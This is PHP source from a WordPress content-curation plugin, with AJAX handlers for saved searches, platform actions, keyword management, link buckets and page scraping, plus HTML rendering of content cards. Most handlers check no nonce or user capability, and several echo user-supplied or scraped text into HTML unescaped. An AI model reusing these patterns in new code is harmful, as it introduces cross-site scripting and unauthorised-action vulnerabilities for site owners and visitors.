    $parameter_id = trim($_POST['parameter_id']); // should be keyword, rss feed, domain,
    delete_option('cs_le_detail_search_saves_' . $parameter_id . '_' . $platform_id);
    $status = 'success';
    echo json_encode(array('status' => $status));
    die();
}

add_action('wp_ajax_cs_le_detail_search_delete_item', 'cs_le_detail_search_delete_item');

function cs_le_detail_search_save_item()
{
    $platform_id = trim($_POST['platform_id']);
    $cu_platform_display_parameters = trim($_POST['cu_platform_display_parameters']);
    $parameter_id = trim($_POST['parameter_id']); // should be keyword, rss feed, domain,
    $parameter_text = trim($_POST['parameter_text']); // would be the actual keyword, user search keyword, or domain name
    $search_type = trim($_POST['search_type']);
    $order_by = trim($_POST['order_by']);
    $return_arr = cs_le_add_search_detail_item($search_type, $parameter_id, $parameter_text, 'user', $platform_id);
    $status = $return_arr['status'];
    $message = $return_arr['message'];
    $post_list = get_cs_le_search_detail_saved_items_html($search_type, $platform_id);

    echo json_encode(array('status' => $status, 'message' => $message, 'results' => $post_list));
    die();
}

add_action('wp_ajax_cs_le_detail_search_save_item', 'cs_le_detail_search_save_item');
/**
 * This function takes a ContentItem array and creates the display elements to be output on the listening page.
 * This function exists so we only have one place to edit this and we can call it in multiple places.
 *
 * @param Array $ContentItem
 *
 * @return void
 */
function ybi_listening_page_content($platform_id, $ContentItem, $load_video_player = false)
{

    if (!($ContentItem['id']))
        return '';

    $show_platform_display = get_option("ybi_cs_hide_platform_display_features");
    $current_url = $ContentItem['url'];

    $date = new DateTime($ContentItem['published_date']);
    $pubDate = $date->format('m/d/Y h:i a');

    $fav_icon = $ContentItem['DomainData']['data']['fav_icon_url'];
    $background_img = '';
    if ($fav_icon != '')
        $background_img = ' style="background: no-repeat url(' . $fav_icon . ') left center; background-size: 16px 16px; padding-left: 21px;"';

    $thumbnail_html = '';


    $save_content_action = 'add';
    $save_content_icon = '-o';
    $saved_content_class = '';
    if ($ContentItem['is_saved'] == true) // these are the saved items for the platform, if it's loaded then we switch up the actions
    {
        $save_content_action = 'remove'; // this will remove this from the saved
        $save_content_icon = ''; // show the closed icon in these results to signify this content item is saved
        $saved_content_class = ' selected';
    }

    $snippet = $ContentItem['snippet'];
    /*
	if (strlen($snippet) > 200) {
		// truncate string
		$stringCut = substr($snippet, 0, 200);

		// make sure it ends in a word so assassinate doesn't become ass...
		$snippet = substr($stringCut, 0, strrpos($stringCut, ' ')).'...';
	}
	*/
    $commentary = 'add commentary';
    if ($ContentItem['PlatformDisplay']['commentary'] != '')
        $commentary = stripslashes($ContentItem['PlatformDisplay']['commentary']);

    $activeClass = '';
    $featuredClass = '';
    if ($ContentItem['PlatformDisplay']['active'] == 1)
        $activeClass = ' selected';

    if ($ContentItem['PlatformDisplay']['featured'] == 1)
        $featuredClass = ' selected';

    // this is the class so we know what elements to ignore
    $source_row_name = str_replace(".", "_", $ContentItem['source_domain']);

    $domain_id = $ContentItem['DomainData']['data']['id'];

    $new_post_url = $current_url;
    $new_post_url = str_replace("http://", "", $new_post_url);
    $new_post_url = str_replace("https://", "xxxxs", $new_post_url);
    $post_list = '';

    $content_type_css = 'cs_article';
    $youtube_video_id = '';
    $is_video = false;
    if ($ContentItem['content_type_name'] == 'video') {
        $content_type_css = 'cs_video';
        $is_video = true;
        $youtube_video_id = cs_getYouTubeVideoID($current_url);
    }

    if ($is_video && $load_video_player) {
        $video_id = cs_getYouTubeVideoID($current_url);
        $thumbnail_html = '<iframe width="330" height="186" src="https://www.youtube.com/embed/' . $video_id . '?rel=0" frameborder="0" allowfullscreen></iframe>';
    } else {
        if ($ContentItem['image_src']) {
            if ($is_video) {
                $thumbnail_html = '<a href="javascript:;" id="' . $youtube_video_id . '" class="cs_tutorial_popup">
				<img src="' . $ContentItem['image_src'] . '" class="item_thumb cs_youtube_thumb" /></a>';
            } else {
                $thumbnail_html = '<a href="' . $current_url . '" target="_blank"><img src="' . $ContentItem['image_src'] . '" class="item_thumb" /></a>';
            }

        }
    }

    $post_list .= '<div class="brick ' . $content_type_css . '  available cu_cid_row_' . $ContentItem['id'] . ' source_' . $domain_id . '" data-content-item-id="' . $ContentItem['id'] . '">
        <div class="top_wrapper">
        <a href="javascript:;" cur_action="add" type="ignore-content-item" parameter_id="' . $ContentItem['id'] . '" class="cu_platform_action close"><i class="fa fa-minus-circle"></i></a>
		<a href="javascript:;" cur_action="' . $save_content_action . '" type="save-content-item" parameter_id="' . $ContentItem['id'] . '" 
			class="save cu_platform_action save_content_item save_content_item_' . $ContentItem['id'] . $saved_content_class . '">
			 <i class="fa fa-bookmark' . $save_content_icon . '"></i></a>';

    if ($show_platform_display)
        $post_list .= '<a href="javascript:;" cur_action="active" parameter_id="' . $ContentItem['id'] . '" class="cu_platform_display_action display_active ' . $activeClass . '"><i class="fa fa-th-large' . $activeClass . '"></i></a>';
    // domain search change
    //<a href="javascript:;" search_type="domain_name_id" order_by="most_recent" parameter_id="'.$domain_id.'" class="cu_le_detail_search"><i class="fa fa-search"></i></a>
    $post_list .= '<a href="javascript:;" parameter_id="' . $ContentItem['id'] . '" class="display_draft_option cu_create_draft cu_draft_icon_' . $ContentItem['id'] . '">
	    <i class="fa fa-pencil"></i></a>
	    <a href="javascript:;" parameter_id="' . $ContentItem['id'] . '" class="le_show_quick_editor le_show_qe_button cu_qe_icon_' . $ContentItem['id'] . '">
	    <i class="fa fa-pencil-square-o"></i></a>
	    
	    <a href="post-new.php?platform_id=' . $ContentItem['PlatformDisplay']['platform_id'] . '&content_item_id=' . $ContentItem['id'] . '&u=' . urlencode($new_post_url) . '" class="curate" target="_blank"><img src="' . plugins_url() . '/curation-suite/i/curation-suite-icon-15x19.png" /></a>
        <p class="muted le_article_date">' . $pubDate . '</p>
        </div>
		<h4><a href="' . $current_url . '" target="_blank">' . html_entity_decode($ContentItem['title']) . '</a></h4>
    	<div class="content_actions">
	    </div>
	    <div class="thumb">' . $thumbnail_html . '</div>
        <div class="source_snippet">
        <p' . $background_img . ' class="le_source">';

    if ($ContentItem['DomainData']['data']['domain_name'] != 'youtube.com') {
        $post_list .= '<span class="le_domain_name">'.$ContentItem['DomainData']['data']['domain_name'] . '</span> <a href="javascript:;" search_type="domain_name_id" order_by="most_recent" parameter_id="' . $domain_id . '" class="cu_le_detail_search">
		<i class="fa fa-search"></i></a><a href="javascript:;" id="link_' . $ContentItem['id'] . '" class="remove_red source_ignore source_ignore_' . $domain_id . '"><i class="fa fa-caret-square-o-down"></i> block</a>
			<div class="pohelp pohelp_link_' . $ContentItem['id'] . '">
			<a href="javascript:;" cur_action="add" type="ignore-source" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> forever</a>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="2-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 2 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="4-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 4 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="12-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 12 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="1" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 1 Day</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="2" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 2 Days</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="7" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 7 Days</a>
			</div></p>';

    } else {
        if (array_key_exists('source_name', $ContentItem)) {
            //$post_list .= '<a href="https://youtube.com/'.$ContentItem['source_name'].'" target="_blank">'.$ContentItem['source_name'] . '</a></p>';
            $post_list .= $ContentItem['source_name'] . '</p>';
        }
    }

    if ($show_platform_display)
        $post_list .= '<div class="commentary commentary_' . $ContentItem['id'] . '" cur_action="commentary" parameter_id="' . $ContentItem['id'] . '">' . $commentary . '</div>';

    $post_list .= '<p class="snippet">' . $snippet . '</p>';
    //$update_text = html_entity_decode(trim($update_text), 0, 'UTF-8');
    $update_text = urlencode($ContentItem['title']);
    $permalink = urlencode($current_url);
    $api_key = get_option('curation_suite_listening_api_key');
    $base_share_url = CS_API_BASE_URL . 'share/?api_key=' . $api_key . '&platform_id=' . $platform_id . '&cid=' . $ContentItem['id'];

    $post_list .= '<span class="narrative_link_w"><a href="javascript:;" class="cs_le_add_narrative new_narrative_block cs_bad" data-content-item-id="'.$ContentItem['id'].'"><i class="fa fa-minus" aria-hidden="true"></i> Block Narrative</a></span><span class="share_items">
    <a href="' . $base_share_url . '&network=hootsuite&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('youbrandinc_products/i/hootsuite-icon_24.png') . '" /></a>
    <a href="' . $base_share_url . '&network=sniply&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('curation-suite/i/sniply-icon-28.png') . '" /></a>
    <a href="' . $base_share_url . '&network=oktopost&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="oktopost"><img class="oktopost_share" src="' . plugins_url('curation-suite/i/oktopost-icon-24.png') . '" /></a>';
    $post_list .= '<a href="' . $base_share_url . '&network=buffer&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="buffer"><img class="buffer_share" src="' . plugins_url('youbrandinc_products/i/buffer-logo.png') . '" /></a></span></div>';

    $keyword_arr = $ContentItem['keyword_arr'];
    $keyword_html = '';
    if (isset($keyword_arr) && count($keyword_arr) > 0) {
        $keyword_html .= '<div class="keywords"><em>Keywords</em>:<br>';
        foreach ($keyword_arr as $Keyword) {
            // keywrod search change
            $keyword_html .= '<span class="keyword cu_keyword_' . $Keyword['id'] . '">' . stripslashes($Keyword['keyword']) . '
				<a href="javascript:;" search_type="keyword" order_by="total_shares" parameter_id="' . $Keyword['id'] . '" class="cu_le_detail_search remove_red keyword_ignore"
				class="remove_red"><i class="fa fa-search"></i></a></span>';
            /*$keyword_html .= '<span class="keyword cu_keyword_'.$Keyword['id'].'">'.stripslashes($Keyword['keyword']).'</span>';*/
        }

        $keyword_html .= '</div>';
    }
    $post_list .= $keyword_html;

    $post_list .= '<div class="content_data">';
    //$post_list .='<span class="get_cqs">: ' .$ContentItem['cqs_score'] . '</span>';
    if ($ContentItem['DomainData']['data']['moz_score'] > 0)
        $post_list .= '<span class="moz_icon"> : ' . $ContentItem['DomainData']['data']['moz_score'] . '</span>';

    $post_list .= '  <span class="cs_share"><i class="fa fa-signal total_share"></i>: ' . number_format($ContentItem['ContentItemData']['data']['share_gravity']) . '</span>';
    $post_list .= '  <span class="cs_share"><i class="fa fa-share-alt-square total_share"></i>: ' . number_format($ContentItem['ContentItemData']['data']['total_shares']) . '</span>';
    $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=facebook&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="facebook"><i class="fa fa-facebook facebook"></i>: ' . $ContentItem['ContentItemData']['data']['facebook_total'] . '</a></span>';
    $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=twitter&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="twitter"><i class="fa fa-twitter twitter"></i>: ' . $ContentItem['ContentItemData']['data']['twitter_shares'] . '</a></span>';
    $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=linkedin&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="linkedin"><i class="fa fa-linkedin linkedin"></i>: ' . $ContentItem['ContentItemData']['data']['linkedin_shares'] . '</a></span>';
    $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=pinterest&text=' . $update_text . '&url=' . $permalink . '&i=' . $ContentItem['image_src'] . '" target="_blank" class="facebook"><i class="fa fa-pinterest pinterest"></i>: ' . $ContentItem['ContentItemData']['data']['pinterest_shares'] . '</a></span>';
    $post_list .= '  <span class="cs_share"><a href="' . $base_share_url . '&network=googleplus&text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="googleplus"><i class="fa fa-google-plus googleplus"></i>: ' . $ContentItem['ContentItemData']['data']['googleplus_shares'] . '</a></span>';

    if ($is_video) {
        $post_list .= '<div class="video_data"> <span class="cs_share"><i class="fa fa-eye" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['view_count']) . '</a></span>';
        $post_list .= ' <span class="cs_share"><i class="fa fa-thumbs-up" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['like_count']) . '</a></span>';
        $post_list .= ' <span class="cs_share"><i class="fa fa-thumbs-down" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['dislike_count']) . '</a></span>';
        $post_list .= ' <span class="cs_share"><i class="fa fa-comments-o" aria-hidden="true"></i> ' . number_format($ContentItem['ContentItemData']['data']['comment_count']) . '</a></span></div>';
    }

    if(CS_API_BASE_URL != 'https://curationwp.com/api/') {
        $post_list .= ' ' . $ContentItem['id'];
    }


    //$post_list .='  <span class="cs_share"><a href="'.$base_share_url . '&network=digg&text='.$update_text.'&url='.$permalink.'" target="_blank" class="digg"><i class="fa fa-digg"></i>: '.$ContentItem['ContentItemData']['data']['diggs']. '</a></span>';
    //$post_list .='  <span class="cs_share"><a href="'.$base_share_url . '&network=reddit&text='.$update_text.'&url='.$permalink.'" target="_blank" class="reddit"><i class="fa fa-reddit reddit"></i>: '.$ContentItem['ContentItemData']['data']['reddit_shares']. '</a></span>';
    //$post_list .='  <span class="cs_share"><a href="'.$base_share_url . '&network=stumbleupon&text='.$update_text.'&url='.$permalink.'" target="_blank" class="stumbleupon"><i class="fa fa-stumbleupon sumble_upon"></i>: '.$ContentItem['ContentItemData']['data']['stumbleupon_shares']. '</a></span>';
    //$post_list .= 'id: ' . $ContentItem['id'];

    $post_list .= '</div></div>';
    return $post_list;
}


/**
 * This function handles the majority of the platform actions for content, keywords, and sources
 * it takes the relevant data and combines it to the API URL based on the action
 *
 * @return JSON array
 */
function ybi_curation_suite_platform_action()
{
    //global $post;
    $platform_id = trim($_POST['platform_id']);
    $cur_action = trim($_POST['cur_action']);  // get the current action (add, delete)
    $time_frame = trim($_POST['time_frame']);  // get the current action (add, delete)
    $type = trim($_POST['type']); // get the type of action it is
    $parameter_id = trim($_POST['parameter_id']); // get the parameter id, usually the id (content_item_id) from the listening platform
    $curated_url = trim($_POST['curated_url']); // get the parameter id, usually the id (content_item_id) from the listening platform

    //$id = $post->ID;
    $after_curation_action = trim($_POST['after_curation_action']);

    if ($after_curation_action != '') // the after curate action controls if the curation is hidden from the user, if it exists
        $type = $type . '-' . $after_curation_action; // add this to the type that get's sent to the API, the API knows how to handle this

    $data = array('curated_url' => $curated_url, 'time_frame' => $time_frame);


    $cu_current_display_page = trim($_POST['cu_current_display_page']);

    $parm_arr = array('platform-action', $platform_id, $cur_action, $type, $parameter_id);
    $data = ybi_curation_suite_api_call('', $data, $parm_arr);

    // all these below are essentiall class names that are unique that get hidden if the API call was a success
    if ($type == 'ignore-content-item')
        $hide_element = 'cu_cid_row_' . $parameter_id;

    if ($type == 'ignore-keyword')
        $hide_element = 'cu_keyword_' . $parameter_id;

    if ($type == 'save-content-item') {
        if ($cur_action == 'add')
            $hide_element = 'save_content_item_' . $parameter_id; // this is the tag element
        else
            $hide_element = 'cu_cid_row_' . $parameter_id;  // we hide the row if the user clicked unsave
    }
    if ($type == 'curated-content-item-curate-remove') {
        $hide_element = 'cu_cid_row_' . $parameter_id;  // this will hide the row after the user clicks an add to post action button
    }
    if ($type == 'ignore-source') {
        $source_row_name = str_replace(".", "_", $parameter_id);
        $hide_element = 'source_' . $source_row_name;  // this will hide the row after the user clicks an add to post action button
    }


    $status = $data['status'];
    $message = $data['message'];
    echo json_encode(array('status' => $status, 'message' => $message, 'cur_action' => $cur_action, 'type' => $type,
        'hide_element' => $hide_element, 'cu_current_display_page' => $cu_current_display_page, 'passed_parameter_id' => $parameter_id, 'url' => $data['url']
    ));
    die();
}

add_action('wp_ajax_ybi_curation_suite_platform_action', 'ybi_curation_suite_platform_action');

/**
 * summary
 *
 * @param string $myparam
 *
 * @return void
 */
function ybi_curation_suite_platform_display_commentary_action()
{
    $commentary = trim($_POST['commentary']);  // get the api key
    $platform_id = trim($_POST['platform_id']);  // get the api key
    $content_item_id = trim($_POST['content_item_id']);  // get the api key
    $data = array("commentary" => $commentary);
    $parm_arr = array('platform-display', $platform_id, $content_item_id, 'commentary');

    $data = ybi_curation_suite_api_call('', $data, $parm_arr);
    $status = $data['status'];
    $message = $data['message'];

    echo json_encode(array('status' => $status, 'message' => $message, 'commentary' => $commentary));
    die();

}

add_action('wp_ajax_ybi_curation_suite_platform_display_commentary_action', 'ybi_curation_suite_platform_display_commentary_action');


function ybi_curation_suite_platform_display_action()
{
    $cur_action = trim($_POST['cur_action']);  // get the action
    $platform_id = trim($_POST['platform_id']);  // get the platform_id
    $content_item_id = trim($_POST['content_item_id']);
    $icon_html = trim($_POST['icon_html']);
    $parm_arr = array('platform-display', $platform_id, $content_item_id, $cur_action);
    $data = ybi_curation_suite_api_call('', '', $parm_arr);
    $status = $data['status'];
    $featured = $data['PlatformDisplay']['featured'];
    $active = $data['PlatformDisplay']['active'];
    echo json_encode(array('status' => $status, 'featured' => $featured, 'active' => $active, 'icon_html' => $icon_html,
        'data' => $data
    ));
    die();

}

add_action('wp_ajax_ybi_curation_suite_platform_display_action', 'ybi_curation_suite_platform_display_action');


function ybi_curation_suite_get_mini_row_content()
{
    $raw_html = trim($_POST['raw_html']);

    if (!function_exists('file_get_html'))
        require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");
    // create a simple html dom file
    $html = new curationsuite\simple_html_dom();
    $ret_html = '';

    // we create an html page from the content that will be parsed
    $thecontent = '<html><body>' . $raw_html . '</body></html>';
    // now let's reload the content to easily read it
    $html->load($thecontent);

    // these are the elements we search.
    $single_arr = $html->find('img');
    if (!empty($single_arr)) {
        $list_combined = '';
        if ($single_arr[0]->getAttribute('src'))
            $imageURL = '<span class="content_demand_image_span"><img src=' . $single_arr[0]->getAttribute('src') . ' class="alignleft" /></span>';
        else
            $imageURL = '';
    }
    $ret_html .= $imageURL;
    $single_arr = $html->find('p');
    if (!empty($single_arr))
        $ret_html .= $single_arr[0]->plaintext;

    $single_arr = $html->find('a');
    if (!empty($single_arr)) {
        $list_combined = '';
        if ($single_arr[0]->getAttribute('href'))
            $URL = '<a href=' . $single_arr[0]->getAttribute('href') . ' target="_blank">' . $single_arr[0]->plaintext . '</a>';
        else
            $URL = '';
    }
    $ret_html .= $URL;


    echo json_encode(array('overall_text' => stripslashes($ret_html)));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_mini_row_content', 'ybi_curation_suite_get_mini_row_content');

// this is the main scraping function
function ybi_curation_suite_get_scrape_content()
{
    // get the scrape url and the source combined from the dropdown
    $content_scrape_id = trim($_POST['content_scrape_id']);
    $load_direct_share = trim($_POST['load_direct_share']);

    $pieces = explode("|||", $content_scrape_id);
    $scrape_source = $pieces[0]; // first part is the source
    $scrape_url = $pieces[1]; // second part is the url

    $post_list = '';
    $post_list .= '<table class="wp-list-table widefat fixed posts" cellspacing="0">';
    $i = 0;
    $c = 0;
    $alternate = '';
    $current_url = '';
    $imgSRC = '';

    $blurb = '';
    $source = '';
    $published = '';
    $blurbText = '';
    $sourceText = '';
    $publishedText = '';
    $linkTitle = '';
    $linkHREF = '';
    $imageURL = '';
    $current_url = '';
    $image = '';

    function get_search_row_html($i, $imageClass, $imageURL, $current_url, $linkTitle, $cqs_details, $sourceText, $publishedText, $blurbText, $load_direct_share)
    {
        $alternate = '';
        if (0 != $i % 2): $alternate = ' alternate'; endif;
        $imageHTML = '';
        if ($imageURL != '')
            $imageHTML = '<span class="' . $imageClass . '"><img src="' . $imageURL . '" /></span>';

        $html = '';
        $html = '<tr class="type-post status-publish format-standard hentry scrape_row_' . $i . $alternate . '"><td>' . $imageHTML . '
		 <a href="' . $current_url . '" target="_blank">' . $linkTitle . '</a> 
		<br />from ' . $sourceText . ' published on ' . $publishedText . '
		<p class="desc">' . $blurbText . '</p>
		</td><td class="content_search_actions"><a href="javascript:;" class="add_scrape_to_post" name="scrape_row_' . $i . '">Add</a> | <a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>';

        if ($load_direct_share)
            $html .= getSocialShareBlock($linkTitle, $current_url) . '</td></tr>';
        else
            $html .= '</td></tr>';


        return $html;
    }


    if (!function_exists('file_get_html'))
        require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");

    $html = new curationsuite\simple_html_dom();

    require_once(YBI_CURATION_SUITE_PATH . "lib/web/http.php");
    require_once(YBI_CURATION_SUITE_PATH . "lib/web/web_browser.php");
    $web = new WebBrowser();
    $result = $web->Process($scrape_url);
    // here we check to make sure we could access the page, if the result is success then we load this page
    if ($result['success'])
        $html->load($result["body"]);

    // everything below is looking for the content main wrap class or element
    // we then loop thru all these elements parsing out the text, url, images, etc. that we want to display

    // scoop.it scraping
    if ($scrape_source == 'scoop.it'):
        foreach ($html->find('.post-view') as $article) {
            $blurbText = '';
            $image = $article->find('.thisistherealimage img');
            //var_dump($image);
            if ($image)
                $imageURL = $image[0]->attr['data-original'];
            else
                $imageURL = '';

            $link = $article->find('a');
            if ($link) {
                $linkTitle = $link[0]->plaintext;
                $current_url = $link[0]->href;
            }

            $blurb = $article->find('blockquote');
            if ($blurb):
                $blurbText = $blurb[0]->plaintext;
            endif;

            $blurb = $article->find('.post-description');
            if ($blurb):
                $blurbText .= $blurb[0]->plaintext;
            endif;

            $source = $article->find('.post-metas a');
            $sourceText = $source[0]->plaintext;
            $publishedText = $source[1]->plaintext;
            //add_scrape_to_post
            if ($linkTitle && $current_url) {
                $post_list .= get_search_row_html($i, 'content_demand_image_span', $imageURL, $current_url, $linkTitle, $cqs_details, $sourceText, $publishedText, $blurbText, $load_direct_share);
                $i++;
            }
        }
    endif; //scoop.it
    if ($scrape_source == 'newswhip'):
        foreach ($html->find('article') as $article) {
            $image = $article->find('img');
            if ($image)
                $imageURL = $image[0]->src;
            //$imageURL = '<span class="content_demand_image_small_span"><img src="'.$image[0]->src .'" /></span>';
            // we loop thru the sub elements
            foreach ($article->find('.art-content') as $li) {
                $link = $li->find('h2 a');
                if ($link) {
                    $linkTitle = $link[0]->plaintext;
                    $current_url = $link[0]->href;
                }

                $blurb = $li->find('p');
                if ($blurb):
                    $blurbText = $blurb[0]->plaintext;
                endif;

                $source = $li->find('.art-meta a');
                if ($source):
                    $sourceText = $source[0]->plaintext;
                endif;

                $published = $li->find('.art-meta .visited-ago');
                if ($published):
                    $publishedText = $published[0]->plaintext;
                endif;

                if ($linkTitle && $current_url) {
                    $post_list .= get_search_row_html($i, 'content_demand_image_small_span', $imageURL, $current_url, $linkTitle, $cqs_details, $sourceText, $publishedText, $blurbText, $load_direct_share);
                    $i++;
                }
            }
        } // foreach
    endif;  // newswhip
    if ($scrape_source == 'googlecommunity'):
        $all_links = $html->find('a[class=ot-anchor]');
        function getTitle($all_links, $current_link)
        {
            $title = '';
            foreach ($all_links as $element) {
                if ($element->href == $current_link)
                    $title = $element->title;

                if ($title != '')
                    return $title;
            }

            return '';
        }

        $all_articles = $html->find('div[role=article]');
        $c = count($all_links);
        $current_page = 0;
        $linksAddArr = array();
        foreach ($all_articles as $element) {
            $inner_links = $element->find('a[class=ot-anchor]');
            $current_url = $inner_links[0]->href;
            $linkTitle = getTitle($all_links, $current_url); //$inner_links[0]->title;

            if ($current_url == '')
                continue;
            if (!in_array($current_url, $linksAddArr)) {
                if (0 != $i % 2): $alternate = ' alternate'; endif;

                $imag_arr = $element->find('img[itemprop=image]');
                $content = $element->find('.Ct');
                $bold = $element->find('.Ct b');

                //$imageURL = $imag_arr[0]->src;
                $imgSRC = '';
                $imgSRC = $imag_arr[0]->src;

                if ($imgSRC)
                    $imageURL = $imgSRC;
                else
                    $imageURL = '';

                $publish = $element->find('span[class=Wt]');
                if ($publish)
                    $sourceText = $publish[0]->plaintext;
                else
                    $sourceText = '';

                $source = $element->find('span[class=uv] a');
                if ($source)
                    $publishedText = $source[0]->plaintext;
                else
                    $publishedText = '';


                $blurbText = $content[0]->plaintext;
                if ($linkTitle) {
                    $blurbText = str_replace(trim($linkTitle), "", $blurbText);
                    $blurbText = str_replace('http', ' http', $blurbText);
                    //$post_list .= $title . '</a><p>' . $plainContent . '</p>';
                } else {
                    $linkTitle = $bold[0]->plaintext;
                    if ($title) {
                        $blurbText = str_replace(trim($linkTitle), "", $blurbText);
                        $blurbText = str_replace('http', ' http', $blurbText);
                        //$post_list .= $title . '</a><p>' . $plainContent . '</p>';
                    }

                }

                $post_list .= get_search_row_html($i, 'content_demand_image_span', $imageURL, $current_url, $linkTitle, $cqs_details, $sourceText, $publishedText, $blurbText, $load_direct_share);
                $linksAddArr[] = $current_url;
                $i++;
            }
        }
    endif;

    $post_list .= '</table>';
    echo json_encode(array('results' => $post_list, 'total_posts_display' => $count_posts));

    die();

}

add_action('wp_ajax_ybi_curation_suite_get_scrape_content', 'ybi_curation_suite_get_scrape_content');

/*
 * This is a worker function for getting the quality score of content.
 *
 * @since 1.2
 *
 * @return string|json response with html font awesome icon and css
 */


// this is the worker function for the keyword actions
// we pass the keyword and the action to be performed.
function ybi_curation_suite_user_keyword_actions()
{
    $keyword = trim($_POST['keyword']);
    // action to be performed
    $keywordAction = trim($_POST['keywordAction']);
    $existing_keywords = get_option('curation_suite_user_keywords'); // see if there is keywords already stored
    // if there is a keyword and it's an add, then we we append the keyword to the end of the existing keywords. We seperate each keyword with ||
    if ($keyword && $keywordAction == 'add') {
        $existing_keywords .= '||' . $keyword;
    }

    // below we loop thru exploded array to build keyword HTML and string to update values.
    $keywords_save_list = '';
    $keyword_html = '';
    $pieces = explode("||", $existing_keywords);
    $i = 1;
    $action_class = 'find_content_keyword';
    if ($existing_keywords):
        foreach ($pieces as $val) {

            if ($val == '')
                continue;

            // if it's a delete action we move to the next keyword as this one has been chosen to be deleted
            if ($keywordAction == 'delete' && $val == $keyword)
                continue;

            // seperation text between keywords
            if ($i > 1)
                $keyword_html .= ' | ';

            // if the action is to load delete actions we add to each keyword a minus icon and a class that will change the color and for the jquery call
            if ($keywordAction == 'load_delete_actions') {
                $displayVal = ' <i class="fa fa-minus-circle"></i> ' . stripslashes(htmlentities($val, ENT_QUOTES));
                $action_class = 'delete_content_keyword';
            } else
                $displayVal = stripslashes(htmlentities($val, ENT_QUOTES)); // normal display, click keyword and search is fired, action class is set above

            // this is the html that is returned that is clickable, either to delete the keywrod or to search using the form.
            $keyword_html .= '<a href="javascript:;" name="social_media_actions" rel="' . stripslashes(htmlentities($val, ENT_QUOTES)) . '" class="' . $action_class . '">' . $displayVal . '</a>';
            // this is a combination of saved keywords that will get updated below
            $keywords_save_list .= '||' . $val;
            $i++;
        }
        //  update the keyword string - each keyword seperated by ||
        update_option('curation_suite_user_keywords', $keywords_save_list);
    endif;

    echo json_encode(array('keyword_html' => $keyword_html));

    die();
}

add_action('wp_ajax_ybi_curation_suite_user_keyword_actions', 'ybi_curation_suite_user_keyword_actions');


function ybi_cu_add_link($url, $title, $link_notes, $linkcategories, $add_new_link_bucket_category, $isQuickLink)
{
    $addedTermReturnArr = array();
    $my_post = array(
        'post_title' => $title,
        'post_status' => 'publish',
        'post_type' => 'curation_suite_links',
        'post_content' => $link_notes,
    );

    $post_id = wp_insert_post($my_post);


    $term = '';
    if ($isQuickLink) {
        $term = 'Quick Add Links';
        $term_by_name = get_term_by('name', $term, 'link_buckets');
        //$term_id = is_term($term);
        $term_id = $term_by_name->term_id;
        $linkcategories[] = $term_id;
    }


    if ($add_new_link_bucket_category != '') {
        $term_by_name = get_term_by('name', $add_new_link_bucket_category, 'link_buckets');
        $term_id = is_term($add_new_link_bucket_category);
        //if (!$term_id) {
        $slug = $add_new_link_bucket_category;
        $slug = str_replace(" ", "-", $slug);
        $slug .= '_link_bucket';

        $term_id = wp_insert_term($add_new_link_bucket_category, 'link_buckets',
            array(
                'description' => 'Added bucket via curate.',
                'slug' => $slug,
            ));

        if (!is_object($term_id)) {
            $term_id = $term_id['term_id'];

            $addedTermReturnArr[] = $term_id;
            $addedTermReturnArr[] = $add_new_link_bucket_category;
        }
        //}
        $linkcategories[] = $term_id;

    }
    $returnS = '';
    foreach ($linkcategories as $value) {
        $value = intval($value);
        wp_set_object_terms($post_id, array($value), 'link_buckets', true);
        $returnS .= '-' . $value;
    }
    //ybi_cu_getDomainName
    add_post_meta($post_id, '_bucket_url', $url, true);
    add_post_meta($post_id, '_bucket_url_domain', ybi_cu_getDomainName($url), true);
    return $addedTermReturnArr;

}

function ybi_add_curation_suite_link()
{

    if (wp_verify_nonce($_POST['curate_action_add_link_nonce'], 'curate_action_add_link_nonce')) {
        $title = trim($_POST['title']);
        $url = trim($_POST['url']);
        $linkcategories = $_POST['linkcategories'];
        $add_new_link_bucket_category = $_POST['add_new_link_bucket_category'];
        $link_notes = $_POST['link_notes'];
        $close_options = $_POST['close_options'];
        $addedTermReturnArr = ybi_cu_add_link($url, $title, $link_notes, $linkcategories, $add_new_link_bucket_category, false);
        echo json_encode(array('results' => 'Link has been added', 'close_options' => $close_options, 'add_term_array' => $addedTermReturnArr));

    }
    die();
}

add_action('wp_ajax_ybi_add_curation_suite_link', 'ybi_add_curation_suite_link');


